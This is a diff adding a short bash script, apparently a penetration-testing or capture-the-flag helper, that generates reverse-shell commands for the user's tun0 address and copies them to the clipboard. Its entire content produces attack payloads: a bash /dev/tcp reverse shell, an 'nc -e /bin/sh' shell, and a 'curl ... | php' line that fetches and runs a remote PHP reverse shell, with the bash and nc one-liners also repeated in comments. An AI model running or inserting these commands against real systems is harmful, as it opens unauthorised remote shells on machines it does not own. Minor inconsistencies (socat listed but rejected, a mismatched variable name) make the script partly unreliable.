@@ -1,0 +1,71 @@
+#!/bin/bash
+# revShell
+# arg1 - program to send rev sheel (bash, nc, socat, php,etc....)
+# arg2 - listen port
+
+# bash -c 'bash -i >& /dev/tcp/tun0IP/port 0>&1'
+#nc -e /bin/sh tun0IP port
+
+
+#open nc -lvnp port in another 
+
+senderProgram=$1
+listenPort=$2
+
+if [ -z "$1" ] || [ -z "$2" ]; then
+	echo
+	echo "Wrong arguments. The format is:" 
+	echo "./revShell invokeShellprogram(bash||nc||socat||php) listenPort"
+	echo
+	exit 1
+fi
+
+commandShellList () {
+	if ! [[ "$1" =~ ^(bash|nc|php)$  ]]; then
+		echo
+		echo "Command not supported to create a reverse shell\nPlease use bash, nc, socat or php"
+		echo
+		exit 1
+	fi
+}
+
+checkPortIsNumber () {
+
+re='^[0-9]+$'
+if ! [[ $1 =~ $re ]] ; then
+	   echo
+	   echo "error: Port is not a number" >&2; 
+	   echo
+	   exit 1
+fi
+
+}
+
+commandShellList $1
+checkPortIsNumber $2
+tun0=$(ip a show tun0)
+phpShell=""
+ip=$(echo -n $tun0 | awk '{print $16}' | awk -F/ '{print $1}')
+
+
+if [[ "$1" == "bash"  ]]
+then	
+	revShell="bash -c 'bash -i >& /dev/tcp/$ip/$listenPort 0>&1'"
+	
+
+elif [[ "$1" == "nc"  ]]
+then
+	revShell="nc -e /bin/sh $ip $listenPort"
+
+else
+	phpshell="[*] With pentestmonkey php-reverse-shell script"
+	revShell="curl $ip:$listenPort/php-reverse-shell.php | php"
+fi
+
+echo
+echo -n $revShell | xclip -sel clipboard
+echo -e "$phpshell\n$revShell"
+echo
+
+exit 0
+
